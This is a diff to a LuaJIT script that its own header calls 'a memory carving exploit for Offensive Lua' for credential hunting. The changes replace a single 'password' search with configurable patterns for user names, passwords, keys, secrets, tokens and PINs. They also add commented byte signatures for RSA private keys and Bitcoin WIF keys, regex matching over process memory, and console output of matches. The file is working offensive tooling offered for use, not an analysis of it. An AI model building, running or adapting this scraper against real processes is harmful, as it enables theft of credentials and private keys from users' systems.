@@ -1,6 +1,7 @@
--- memorysearch.lua
--- Memory searcher for ASCII and UTF-16LE strings
--- Safe for execution in DLL worker threads with LuaJIT
+-- memorysearch.lua - a memory carving exploit for Offensive Lua. 
+-- Memory scanner with regex pattern matching for credential hunting
+-- Searches current process memory for sensitive strings using Lua patterns
+-- Configure REGEX_PATTERNS below to customize search terms
 
 local jit = require("jit")
 -- disable JIT optimizations for FFI callbacks and error handling
@@ -10,7 +11,26 @@ local ffi = require("ffi")
 local bit = require("bit")
 
 -- === Configuration ===
-local SEARCH_STRING = "password"
+-- Lua pattern regex searches (case-insensitive)
+-- For hex byte sequences, use string.char() e.g. string.char(0x41, 0x42, 0x43, 0x44) for ABCD
+local REGEX_PATTERNS = {
+    { pattern = "[Uu][Ss][Ee][Rr]", description = "user" },
+    { pattern = "[Pp][Aa][Ss][Ss][Ww][Oo][Rr][Dd]", description = "password" },
+    { pattern = "[Kk][Ee][Yy]", description = "key" },
+    { pattern = "[Ss][Ee][Cc][Rr][Ee][Tt]", description = "secret" },
+    { pattern = "[Tt][Oo][Kk][Ee][Nn]", description = "token" },
+    { pattern = "[Pp][Ii][Nn]", description = "PIN" },
+    
+    -- Binary/hex byte sequence examples (isPlain = true for exact byte matching)
+    -- { pattern = string.char(0x30, 0x82), description = "RSA private key (DER)", isPlain = true },
+    -- { pattern = string.char(0xFF, 0xD8, 0xFF), description = "JPEG header", isPlain = true },
+    -- { pattern = string.char(0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A), description = "PNG signature", isPlain = true },
+    -- { pattern = string.char(0x52, 0x53, 0x41, 0x31), description = "RSA1 key header", isPlain = true },
+    -- { pattern = string.char(0x2D, 0x2D, 0x2D, 0x2D, 0x2D, 0x42, 0x45, 0x47, 0x49, 0x4E), description = "-----BEGIN", isPlain = true },
+    -- { pattern = string.char(0x80), description = "Bitcoin WIF key prefix", isPlain = true },
+    -- { pattern = string.char(0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07), description = "AES test pattern", isPlain = true },
+}
+
 local CHUNK_SIZE = 0x1000
 local MAX_STRING_CONCAT_SIZE = 0x10000
 local ADDRESS_LIMIT = 0x7FFFFFFFFFFFFFFF
@@ -192,6 +212,8 @@ end
 local function writeLog(logFile, message)
     logFile:write(message)
     logFile:flush()
+    io.write(message)
+    io.flush()
 end
 
 -- Track active log for helpers that lack direct access
@@ -210,6 +232,26 @@ local function toUnicodeLE(str)
         bytes[#bytes + 1] = string.char(c, 0)
     end
     return table.concat(bytes)
+end
+
+local function hexToBytes(hexStr)
+    -- Convert hex escape sequences like \x41\x42 to actual bytes
+    -- Also supports regular hex strings like "414243"
+    local result = {}
+    
+    -- First try to match \xHH format
+    for hex in hexStr:gmatch("\\x([0-9A-Fa-f][0-9A-Fa-f])") do
+        table.insert(result, string.char(tonumber(hex, 16)))
+    end
+    
+    -- If no \x format found, try plain hex pairs
+    if #result == 0 then
+        for hex in hexStr:gmatch("([0-9A-Fa-f][0-9A-Fa-f])") do
+            table.insert(result, string.char(tonumber(hex, 16)))
+        end
+    end
+    
+    return table.concat(result)
 end
 
 local function isReadableProtection(protect)
@@ -462,35 +504,51 @@ local function scanRegion(processHandle, logFile, baseAddr, regionSize, searcher
                 local combinedLen = #combined
                 local patternLen = search.patternLen
 
-                if patternLen > 0 and combinedLen >= patternLen then
-                    local searchStart = math.max(1, tailLen - patternLen + 1)
+                -- For regex, we search regardless of pattern length (variable length)
+                -- For literal strings/hex, we need minimum pattern length
+                if (search.isRegex and combinedLen > 0) or (patternLen > 0 and combinedLen >= patternLen) then
+                    local searchStart = search.isRegex and 1 or math.max(1, tailLen - patternLen + 1)
                     local pos = searchStart
                     local matchLimit = 1000  -- Prevent infinite loop on repetitive patterns
                     local matchCount = 0
                     
                     while matchCount < matchLimit do
                         -- Protected string search
-                        local findSuccess, found = pcall(string.find, combined, search.pattern, pos, true)
+                        local findSuccess, found, foundEnd
+                        
+                        if search.isRegex then
+                            -- Use pattern matching for regex
+                            findSuccess, found, foundEnd = pcall(string.find, combined, search.pattern, pos)
+                        else
+                            -- Use plain text search for literal strings/hex bytes
+                            findSuccess, found = pcall(string.find, combined, search.pattern, pos, true)
+                            if findSuccess and found then
+                                foundEnd = found + patternLen - 1
+                            end
+                        end
+                        
                         if not findSuccess or not found then 
                             break 
                         end
                         
                         matchCount = matchCount + 1
-                        local foundEnd = found + patternLen - 1
+                        
+                        -- Calculate actual match length for regex patterns
+                        local actualMatchLen = foundEnd - found + 1
                         
                         if foundEnd > tailLen then
                             local combinedZero = found - 1
                             local absoluteAddr = readAddr - tailLen + combinedZero
                             
                             -- Protected context extraction
-                            local ctxSuccess, context = pcall(makeContext, processHandle, baseAddr, regionEnd, absoluteAddr, patternLen, search.isUnicode)
+                            local ctxSuccess, context = pcall(makeContext, processHandle, baseAddr, regionEnd, absoluteAddr, actualMatchLen, search.isUnicode)
                             if ctxSuccess then
                                 search.count = search.count + 1
                                 logMatch(logFile, search.label, search.count, absoluteAddr, context, search.isUnicode)
                             end
                         end
                         
-                        pos = found + search.step
+                        pos = foundEnd + 1
                         if pos > combinedLen then
                             break
                         end
@@ -604,31 +662,34 @@ function main()
     local use32bitStruct = is32bitCode  -- Use 32-bit struct if code is 32-bit, regardless of process
     writeLog(logFile, string.format("Will use 32-bit MEMORY_BASIC_INFORMATION struct: %s\n", tostring(use32bitStruct)))
 
-    local search_ascii = SEARCH_STRING
-    local search_unicode = toUnicodeLE(SEARCH_STRING)
-
-    local searchers = {
-        {
-            label = "ASCII",
-            pattern = search_ascii,
-            patternLen = #search_ascii,
+    -- Build searchers for regex patterns only (most efficient - one pass per region)
+    local searchers = {}
+    
+    writeLog(logFile, "\n=== SEARCH CONFIGURATION ===\n")
+    writeLog(logFile, string.format("Regex patterns: %d\n", #REGEX_PATTERNS))
+    
+    -- Add regex pattern searchers (ASCII only for efficiency)
+    for idx, regexDef in ipairs(REGEX_PATTERNS) do
+        local pattern = regexDef.pattern
+        local description = regexDef.description or pattern
+        local isPlain = regexDef.isPlain or false
+        
+        writeLog(logFile, string.format("  [%d] %s: %s\n", idx, description, isPlain and "(hex bytes)" or pattern))
+        
+        table.insert(searchers, {
+            label = string.format("%s[%s]", isPlain and "HEX" or "REGEX", description),
+            pattern = pattern,
+            patternLen = isPlain and #pattern or 0,
             isUnicode = false,
+            isRegex = not isPlain,
             step = 1,
             tail = "",
-            tailSize = math.max(0, #search_ascii - 1),
+            tailSize = isPlain and math.max(0, #pattern - 1) or 256,
             count = 0
-        },
-        {
-            label = "UTF-16LE",
-            pattern = search_unicode,
-            patternLen = #search_unicode,
-            isUnicode = true,
-            step = 2,
-            tail = "",
-            tailSize = math.max(0, #search_unicode - 2),
-            count = 0
-        }
-    }
+        })
+    end
+    
+    writeLog(logFile, string.format("Total searchers: %d\n", #searchers))
     
     writeLog(logFile, string.format("Process Name: %s\n", processName))
     writeLog(logFile, string.format("Opened handle to PID %d: 0x%X\n", pid, tonumber(ffi.cast("intptr_t", processHandle))))
@@ -739,13 +800,22 @@ function main()
     writeLog(logFile, "\n=== SUMMARY ===\n")
     writeLog(logFile, string.format("Regions inspected: %d\n", regions))
     writeLog(logFile, string.format("Readable regions: %d\n", readableRegions))
+    writeLog(logFile, "\nMatches by searcher:\n")
+    
+    local totalMatches = 0
     for _, search in ipairs(searchers) do
-        writeLog(logFile, string.format("%s matches: %d\n", search.label, search.count))
+        if search.count > 0 then
+            writeLog(logFile, string.format("  %s: %d\n", search.label, search.count))
+        end
+        totalMatches = totalMatches + search.count
     end
+    
+    writeLog(logFile, string.format("\nTotal matches found: %d\n", totalMatches))
 
     logFile:close()
     currentLogFile = nil
-    print(string.format("Scan complete. %d regions inspected, %d readable, results logged to %s", regions, readableRegions, logPath))
+    print(string.format("Scan complete. %d regions inspected, %d readable, %d total matches found", regions, readableRegions, totalMatches))
+    print(string.format("Results logged to: %s", logPath))
 end
 
 local ok, err = pcall(main)
